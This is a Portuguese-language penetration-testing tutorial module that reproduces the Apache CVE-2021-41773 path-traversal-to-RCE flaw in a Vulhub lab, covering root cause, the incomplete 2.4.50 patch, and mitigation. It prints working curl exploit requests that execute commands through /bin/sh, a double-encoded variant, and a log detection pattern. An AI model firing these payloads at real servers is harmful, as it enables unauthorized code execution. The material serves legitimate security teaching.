## 1. Abertura — o que você vai aprender e por quê

Um scanner cospe uma linha: *"Apache 2.4.49 — CVE-2021-41773 (crítica, 9.8)"*. E agora? Um iniciante escreve no relatório "servidor vulnerável a RCE" e segue em frente. Um profissional sabe que aquilo é só uma **hipótese**: a mesma versão pode dar execução remota de código, ou só leitura de arquivo, ou nada — depende de como o servidor está configurado. A diferença entre os dois é saber **reproduzir a falha** num ambiente isolado, provar o impacto real e entender a causa e a correção. É isso que este módulo ensina, usando uma CVE real e famosa como estudo de caso.

Você vai pegar uma <GlossaryTerm term="CVE">CVE</GlossaryTerm> (Common Vulnerabilities and Exposures — o identificador único de uma falha conhecida, no formato `CVE-ano-número`) do zero: ler o boletim, montar o laboratório com o <GlossaryTerm term="Vulhub">Vulhub</GlossaryTerm>, reproduzir o ataque com suas próprias mãos, dissecar **por que** a falha existe e conferir **o que** de fato a corrige. A CVE escolhida — a CVE-2021-41773 do Apache HTTP Server — é perfeita para aprender porque tem três lições num pacote só: uma causa-raiz elegante (um bug de normalização de caminho), uma história de **correção incompleta** (o primeiro patch não bastou e nasceu uma segunda CVE) e exploração real no mundo todo.

**Ao final, você vai saber:**

- ler uma CVE em fonte primária (Apache, <GlossaryTerm term="NVD">NVD</GlossaryTerm>, <GlossaryTerm term="KEV">CISA KEV</GlossaryTerm>) e extrair versão afetada, impacto, <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> e correção;
- reproduzir a CVE-2021-41773 no lab, confirmando o <GlossaryTerm term="remote code execution">RCE</GlossaryTerm> com evidência real;
- explicar a causa-raiz (a ordem de `decode`/normalização do caminho) e por que a 2.4.50 não bastou;
- distinguir o que **corrige** a falha do que apenas **reduz o impacto**, e aplicar isso na defesa.

**Pré-requisitos:** 5.3 — Metasploit Framework do zero (o fluxo `search → use → set → run` e a ideia de um módulo de exploit; aqui faremos o mesmo ataque "na unha" com `curl`, para enxergar cada byte que o Metasploit automatiza).

## 2. Teoria aprofundada — o conceito por dentro

### 2.1 O ciclo de vida de uma CVE

Antes de explorar, entenda o objeto. Uma **CVE** não é a falha em si — é um **identificador**. Quando alguém descobre uma vulnerabilidade num software conhecido, uma organização credenciada (uma *CNA*, CVE Numbering Authority) atribui um número único, `CVE-ano-sequência`. Esse número vira o nome próprio da falha: todo mundo (fabricante, scanner, notícia, scanner do seu cliente) passa a falar dela pelo mesmo rótulo.

Em volta da CVE orbitam metadados que você precisa saber ler:

- A <GlossaryTerm term="CWE">CWE</GlossaryTerm> (Common Weakness Enumeration) classifica o **tipo** da falha. A CVE-2021-41773 é CWE-22, *path traversal*. Enquanto a CVE é "esta falha neste produto", a CWE é "a que família ela pertence" — útil para reconhecer o padrão em outros alvos.
- A <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> (Common Vulnerability Scoring System) é a **nota de gravidade**, de 0 a 10, calculada a partir de um vetor (vetor de ataque, complexidade, privilégio exigido, impacto em confidencialidade/integridade/disponibilidade). Atenção: a CVSS pontua **um cenário de impacto**, não o número de vítimas. Você vai ver que a MESMA falha tem duas notas, conforme o cenário.
- O <GlossaryTerm term="NVD">NVD</GlossaryTerm> (National Vulnerability Database, do NIST) é o banco público que enriquece cada CVE com CVSS, CWE, versões afetadas e referências. É sua fonte primária para a ficha técnica.
- O <GlossaryTerm term="KEV">CISA KEV</GlossaryTerm> (Known Exploited Vulnerabilities) é o catálogo da agência americana CISA que lista o que está sendo **explorado na prática**, com prazo de correção para órgãos federais. Ele responde a pergunta que a CVSS não responde: "alguém está usando isto agora?".
- O <GlossaryTerm term="EPSS">EPSS</GlossaryTerm> (Exploit Prediction Scoring System) estima a **probabilidade** de exploração nos próximos 30 dias. CVSS diz "quão grave"; EPSS e KEV dizem "quão provável / já acontecendo". Defesa madura prioriza cruzando os três.

Uma distinção que organiza a cabeça: uma falha recém-descoberta, ainda sem patch, explorada antes de o fabricante saber, é um <GlossaryTerm term="zero-day">zero-day</GlossaryTerm>. Depois que o patch sai, quem continua explorando quem não atualizou está usando um <GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm> — e a maioria esmagadora dos ataques reais é com n-day, porque tem sempre quem não atualizou. Reproduzir CVEs é treinar exatamente para o mundo dos n-days.

### 2.2 A causa-raiz: normalização de caminho

Para o servidor web, servir um arquivo é traduzir um caminho de URL (ex.: `/images/logo.png`) em um caminho de arquivo no disco, **dentro** de uma pasta base: o <GlossaryTerm term="document root">document root</GlossaryTerm> (em geral algo como `/usr/local/apache2/htdocs`). A regra sagrada é: o caminho resolvido tem de ficar dentro dessa pasta. Se um atacante consegue fazer o servidor resolver um caminho **para fora** dela — lendo `/etc/passwd`, por exemplo — isso é uma <GlossaryTerm term="path traversal">path traversal</GlossaryTerm>, o truque dos `../` que sobem um nível de diretório.

Todo servidor sério filtra `../`. Então por que a 2.4.49 caiu? Por causa da **ordem** da <GlossaryTerm term="path normalization">path normalization</GlossaryTerm> — o processo de pôr o caminho na forma canônica (resolver `.`, `..`, barras duplas e sequências codificadas) antes de mapeá-lo. O atacante não manda `../` cru; ele manda os pontos **codificados**: `%2e` é o <GlossaryTerm term="percent-encoding">percent-encoding</GlossaryTerm> (a forma `%XX` de escrever um byte numa URL) do caractere `.`. Então `.%2e/` é, depois de decodificado, `../`.

A mudança feita na 2.4.49 passou a decodificar o `%2e` para `.` **tarde demais** — depois do ponto em que o servidor verifica a presença de `..`. Resultado: na hora de filtrar a travessia, o `..` ainda estava disfarçado de `.%2e` e passou batido; na hora de mapear o arquivo, o `%2e` já virara `.` e a travessia funcionava. Um erro de ordem, não de intenção.

Falta uma peça para a travessia virar RCE em vez de só leitura: o <GlossaryTerm term="CGI">CGI</GlossaryTerm> (Common Gateway Interface — o mecanismo clássico em que o servidor **executa** um programa e devolve a saída, em vez de só servir o arquivo). Se o caminho atravessado cai numa área marcada como CGI (um `ScriptAlias`), o servidor não lê o arquivo alcançado — ele tenta **executá-lo**. Aponte a travessia para `/bin/sh` e você fez o servidor rodar um shell. É esse detalhe que separa a nota 7.5 (só leitura) da nota 9.8 (RCE), e é por isso que o boletim do Apache diz "*if CGI scripts are also enabled... this could allow for remote code execution*".

### 2.3 Por que patch não é botão mágico

A lição mais cara desta CVE não é o ataque — é a correção. O Apache lançou a 2.4.50 em 04/10/2021 para tapar o buraco. Só que o patch tratou o sintoma visível (`%2e`) e esqueceu um caminho equivalente: a <GlossaryTerm term="double encoding">double encoding</GlossaryTerm>. Se você escreve o próprio `%` de forma codificada — `%25` é `%` — então `%%32%65` decodifica para `%2e`, que num segundo passe decodifica para `.`. A 2.4.50 barrava `.%2e/`, mas `.%%32%65/` ainda escapava. Isso virou a **CVE-2021-42013**: um caso de <GlossaryTerm term="regression">regression</GlossaryTerm>, o patch que corrige pela metade. Só a 2.4.51, de 07/10/2021, fechou de verdade.

Guarde esta frase: **"atualizei" não é sempre "corrigi"**. Qual versão exatamente fecha a falha é um fato que você confere na fonte, não assume. Aqui, a resposta é 2.4.51 — e ela é parte da flag deste módulo.

## 3. Como o ataque funciona — a mecânica

Vamos montar o exploit campo a campo, com `curl` (o Metasploit do 5.3 faz exatamente isto, só que empacotado). O alvo do lab é o Apache 2.4.49; do Kali, ele responde em `http://vulhub/`.

**Passo 1 — a travessia.** O payload é um caminho que sobe de diretório usando pontos codificados. Repare: o primeiro ponto vem cru e o segundo codificado (`.%2e`), um detalhe necessário para casar com o parsing do servidor. Encadeando `%2e%2e/` (que é `../`) o suficiente, chegamos à raiz do sistema de arquivos e descemos até o alvo:

```text
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
         └──┬──┘└────────┬────────┘└──┬──┘
         sobe 1     sobe até a raiz   alvo: o shell
```

**Passo 2 — por que `/cgi-bin/`.** Esse prefixo casa com o `ScriptAlias /cgi-bin/` do alvo: tudo sob ele é tratado como script para **executar**. Então a travessia não lê o `/bin/sh` — ela o executa. Mandamos o comando no corpo da requisição (um `POST`), que o shell recebe na entrada padrão. O cabeçalho `Content-Type` e a linha em branco (`echo;`) são para a saída voltar como texto:

```console
$ curl -sS --path-as-is \
    -d 'echo Content-Type: text/plain; echo; id' \
    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Pronto: execução remota de código. O `id` é a prova — estamos rodando comandos no servidor, como o usuário `daemon`.

**Passo 3 — a opção que todo mundo esquece: `--path-as-is`.** O bug está na normalização do **servidor**, então o caminho malicioso precisa chegar **cru** até ele. Por padrão, o `curl` "conserta" o caminho no cliente antes de enviar — resolve os `../` e colapsa a travessia. Veja a diferença:

```console
$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' \
    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo x'
HTTP 404
```

Sem `--path-as-is`, o próprio `curl` desarmou o ataque e o servidor respondeu 404. Quem não conhece esse detalhe testa, vê 404 e conclui (errado) que o alvo não é vulnerável.

## 4. Casos reais — o que aconteceu no mundo

### CVE-2021-41773 — o zero-day do Apache (outubro de 2021)

A CVE-2021-41773 não é um exemplo de laboratório: foi um **zero-day explorado na internet** no momento em que foi divulgada. O próprio boletim oficial do Apache carrega a frase, que é incomum: *"This issue is known to be exploited in the wild"* ("sabe-se que esta falha está sendo explorada na prática"). O time do httpd foi avisado em **29/09/2021** e, pressionado pela exploração ativa, lançou a 2.4.50 em **04/10/2021** — menos de uma semana depois. A pressa cobrou seu preço: o patch foi incompleto, nasceu a **CVE-2021-42013**, e a 2.4.51 saiu em **07/10/2021**.

- **Impacto:** varreduras em massa começaram em dias. A falha pega o Apache HTTP Server 2.4.49 (e a 2.4.50, para a 42013), um dos servidores web mais usados do mundo — dezenas de milhares de instâncias expostas. Com CGI habilitado, ia direto a RCE (CVSS **9.8**); sem CGI, leitura de arquivos de configuração e código-fonte (CVSS secundária **7.5**).
- **Reação oficial:** em **03/11/2021**, a CISA incluiu a CVE-2021-41773 no catálogo KEV, com prazo de correção **17/11/2021** para órgãos federais, e marcou associação a campanhas de **ransomware**. Entrar no KEV é o carimbo de "não é teórico, está sendo usado".
- **Lição:** três, na verdade. (1) Um bug "pequeno" de ordem de normalização, num software maduro, vira crítico. (2) Patch com pressa pode ser incompleto — confira a versão que de fato corrige. (3) A gravidade real depende da configuração (CGI ligado ou não) — por isso se **reproduz** antes de afirmar.
- **Fontes primárias:** [Apache httpd — Security vulnerabilities 2.4](https://httpd.apache.org/security/vulnerabilities_24.html) · [NVD — CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) · [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).

### 5.3 Desafio A — provar a causa-raiz no config

O boletim diz que a travessia só funciona se o acesso ao diretório-raiz **não** estiver protegido pelo padrão `Require all denied`. No alvo do lab, alguém **abriu** esse acesso de propósito — e a prova está no arquivo de configuração. Seu objetivo: usar o RCE para ler o `httpd.conf` do alvo e encontrar a diretiva que é a causa-raiz da exploração.

<Hint title="Dica 1">
O arquivo de configuração principal do Apache neste alvo fica em `/usr/local/apache2/conf/httpd.conf`. Você já executa comandos como `daemon` — rode um `grep` nele procurando os blocos `<Directory` e as linhas `Require all`.
</Hint>

<Hint title="Dica 2">
A configuração de fábrica traz `<Directory />` com `Require all denied` (tudo negado na raiz). Procure uma SEGUNDA definição que contradiz essa — um `<Directory />` com `Require all granted`. É ela que abre a porta.
</Hint>

<Solution title="Solução">
```console
$ curl -sS --path-as-is \
    -d 'echo Content-Type: text/plain; echo; grep -nE "<Directory|Require all|ScriptAlias" /usr/local/apache2/conf/httpd.conf' \
    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
248:<Directory />
250:    Require all denied
266:<Directory "/usr/local/apache2/htdocs">
291:    Require all granted
382:    ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
398:<Directory "/usr/local/apache2/cgi-bin">
401:    Require all granted
553:<Directory />
556:    Require all granted
```

As linhas 248-250 são a proteção de fábrica (`Require all denied` na raiz `/`). As linhas 553-556 são um SEGUNDO `<Directory />` que diz `Require all granted` — abrindo o acesso ao sistema de arquivos inteiro. Some isso ao `ScriptAlias /cgi-bin/` (CGI ligado, linha 382) e você tem a receita completa: travessia + raiz liberada + CGI = RCE. **Essa é a causa-raiz concreta neste alvo.**
</Solution>

### 5.4 Desafio B — montar a flag

Agora junte **causa** e **correção** numa flag `FLAG{versao-hash}`:

- `versao`: a **primeira** versão do Apache httpd que corrige a CVE-2021-41773 **de verdade**. Cuidado: a 2.4.50 foi a primeira tentativa e **não bastou** (CVE-2021-42013). Confira na linha do tempo (seção 2.1) ou na fonte do Apache/NVD qual veio depois.
- `hash`: os **12 primeiros caracteres** do SHA-256 do `httpd.conf` do alvo. Calcule o hash **no próprio alvo**, pelo RCE — assim você pega os bytes exatos do arquivo, sem risco de corromper na cópia.

<Hint title="Dica">
O alvo tem o `sha256sum`. Rode-o no `httpd.conf` pelo mesmo canal de RCE e pegue os 12 primeiros caracteres do hash. A versão que corrige está uma posição depois da 2.4.50 na linha do tempo.
</Hint>

## 6. Variações e aprofundamento

**A dupla codificação da CVE-2021-42013.** A 2.4.50 barrou a forma óbvia (`.%2e/`). Mas, como vimos em 2.3, `%%32%65` decodifica para `%2e`. No alvo 2.4.49, que é vulnerável a ambas, você pode comprovar que o payload "de segunda geração" também executa:

```console
$ curl -sS --path-as-is \
    -d 'echo Content-Type: text/plain; echo; id' \
    'http://vulhub/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Os dois payloads chegam ao mesmo `daemon`. A diferença só importa contra a 2.4.50, onde o primeiro falha e o segundo passa — é essa a lacuna que define a 42013.

**Leitura em vez de execução (a nota 7.5).** Neste alvo, o único caminho mapeado para fora do document root é o `/cgi-bin/` (um `ScriptAlias`), então a travessia sempre cai em "executar". Por isso apontar a travessia para `/etc/passwd` devolve 500, não o arquivo: o `mod_cgid` tenta executar o `/etc/passwd` e falha.

```console
$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' --path-as-is \
    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
HTTP 500
```

O 500 é a confirmação de que a travessia chegou ao arquivo — só o handler errado (CGI) impediu a leitura. Num servidor onde a travessia caísse num `Alias` comum (não-script) — ou com o CGI desligado —, a mesma requisição devolveria o conteúdo do arquivo: é exatamente o cenário de leitura que vale a nota secundária 7.5.

**A mesma receita, outras CVEs.** O método que você praticou — ler a CVE, subir o ambiente Vulhub, reproduzir, provar o impacto, conferir a correção — é **genérico**. O Vulhub traz centenas de ambientes (Struts2 S2-045 via header `Content-Type`, Samba, Log4Shell, GitLab...). Troca-se o alvo e a técnica; o processo é o mesmo. É assim que um pentester vira "fluente" em n-days: não decorando exploits, mas sabendo reproduzir qualquer um com método.

**Automatizando com o Metasploit (ponte com o 5.3).** O que você fez na unha, o Metasploit tem pronto no módulo `exploit/multi/http/apache_normalize_path_rce`. Vale rodá-lo contra o mesmo alvo e comparar: o `set RHOSTS vulhub`, o `check` que confirma a versão e o `exploit` que entrega a sessão fazem, por baixo, as mesmas requisições que você montou com `curl`. Entender a mecânica crua é o que te deixa depurar quando o módulo "não funciona".

## 7. Erros comuns

- **404 ao disparar o payload:** quase sempre falta o `--path-as-is`. O `curl` normalizou o caminho no cliente e desarmou o ataque. Confirme também que não há um proxy no meio reescrevendo a URL.
- **"Não é vulnerável" cedo demais:** você testou leitura (`/etc/passwd`) e viu 500, concluindo que falhou. Errado: o 500 prova que a travessia funciona; neste alvo o caminho é RCE via `/bin/sh`, não leitura. Ajuste o alvo da travessia, não desista.
- **O comando não retorna nada / 500 no `/bin/sh`:** faltou mandar o comando no corpo (`-d '...'`) ou a linha de cabeçalho. O CGI precisa de uma saída válida: comece com `echo Content-Type: text/plain; echo;` antes do seu comando.
- **Esperar ser root:** o foothold roda como `daemon` (uid 1), a conta sem privilégio do serviço. Ler arquivos de root ou persistir exige escalar privilégio (Trilha 6). RCE ≠ controle total.
- **Testar a versão errada:** a 41773 só afeta a 2.4.49. Contra 2.4.48 ou 2.4.51 o payload não funciona — e isso é esperado, não um erro seu. Sempre confirme a versão antes.
- **Reset necessário:** se você bagunçou o estado do alvo em testes, use **Resetar** no painel para voltar ao estado de fábrica e refazer limpo.

## 8. Defesa e mitigação

A pergunta que fecha a visão completa: como se defende disto? Separe o que **corrige** do que só **reduz o impacto** — confundir os dois é o erro clássico de quem está começando.

**O que corrige (a única coisa que remove o bug): atualizar.** A falha é no código da normalização de caminho. Só uma versão corrigida a elimina:

```text
Vulnerável:   2.4.49  (CVE-2021-41773)  e  2.4.50  (CVE-2021-42013)
Corrigido:    2.4.51 ou mais novo   ← a correção de verdade
```

Atualizar para 2.4.51+ é a ação de fato. Note o detalhe que o módulo inteiro martela: a 2.4.50 **parecia** a correção e não era. Numa rotina de patch, isso significa conferir a versão-alvo na fonte do fabricante, não assumir "é só atualizar".

**O que reduz o impacto (defesa em profundidade — some, não substitui o patch):**

- **Fechar o acesso ao sistema de arquivos.** A configuração padrão do Apache protege a raiz. Garanta que ela está lá e que ninguém a afrouxou — é exatamente a diretiva que você achou no Desafio A. O seguro é o `deny`, e abrir só o necessário:

```apache
# Seguro: nega o acesso ao sistema de arquivos por padrão (padrão de fábrica).
<Directory />
    AllowOverride none
    Require all denied
</Directory>

# PERIGOSO: isto foi o que abriu o alvo do lab. Nunca em produção.
# <Directory />
#     Require all granted
# </Directory>
```

- **Desligar o CGI se você não usa.** Sem o `mod_cgi`/`mod_cgid` e sem `ScriptAlias`, a mesma travessia, no pior caso, vira leitura de arquivo (nota 7.5) em vez de RCE (9.8). É uma degradação enorme do impacto — mas a falha continua lá; só o patch a remove.
- **Reduzir a superfície e a informação.** `ServerTokens Prod` esconde a versão exata no banner (atrasa o atacante, não o impede — é cosmético). Um WAF (Web Application Firewall) pode bloquear padrões de `%2e`/`../` na URL, mas atacantes contornam com codificações alternativas (a própria 42013 mostra como) — trate o WAF como rede de proteção, não como conserto.

**Como detectar.** A tentativa deixa rastro no log de acesso do Apache: requisições com `%2e`, `../` ou `/cgi-bin/.` seguidas de caminhos estranhos, muitas vezes com status 500 (a travessia que bateu no CGI) ou 200 para `/bin/sh`. Vale um alerta para esse padrão:

```console
$ grep -E '/cgi-bin/\.%2e|%2e%2e|/bin/sh' /usr/local/apache2/logs/access_log
192.168.0.10 - - [15/Oct/2021:12:00:03] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200
```

O exemplo acima usa um IP genérico (`192.168.0.10`); no seu lab o IP de origem será o do próprio Kali na rede interna. O ponto é o **padrão** da URL, que é inconfundível.

## 10. Resumo e glossário

**Pontos-chave:**

- Uma CVE é um **identificador**; em volta dela, leia CWE (tipo), CVSS (gravidade), NVD (ficha), KEV (exploração ativa) e EPSS (probabilidade) — cada um responde uma pergunta diferente.
- A CVE-2021-41773 é um bug de **ordem de normalização de caminho**: decodificar `%2e` depois de filtrar `..` deixa a travessia `.%2e/` passar. Com CGI aliased, vira RCE (9.8); sem, leitura (7.5).
- A correção da 2.4.50 foi **incompleta** (double encoding → CVE-2021-42013); só a **2.4.51** corrige. "Atualizei" não é sempre "corrigi".
- Reproduzir no Vulhub prova o impacto **real** (que depende da configuração, não só da versão) antes de afirmá-lo — a diferença entre "possivelmente vulnerável" e "confirmado".
- Defesa: **atualizar** corrige; fechar o acesso à raiz, desligar CGI e usar WAF **reduzem o impacto**. Nenhum substitui o patch.
